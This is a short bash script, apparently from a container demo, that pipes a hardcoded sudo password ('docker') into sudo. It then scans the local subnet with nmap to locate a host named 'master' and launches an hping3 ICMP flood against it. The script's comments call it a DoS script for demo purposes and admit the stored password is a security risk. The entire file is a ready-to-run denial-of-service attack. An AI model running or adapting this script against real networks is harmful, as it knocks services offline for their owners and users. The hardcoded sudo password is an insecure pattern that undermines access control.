# DoS Script that will be copied and run inside every docker container

# Security risk: We are saving sudo password inside a bash script. This is only done for demo purposes
echo "docker"|sudo -S sudo -S true

# Dynamically get networks' master node IP
netip=$(ifconfig eth0|grep inet|sed -n 1p|awk "{print \$2}"|cut -f 1-3 -d "."|sed 's/$/.*/')
masterip=$(nmap -sP $netip|grep master|awk '{print $NF}'|tr -d '()')

# Run DoS attack
echo "Running hping3"
sudo hping3 -p 80 --flood --icmp $masterip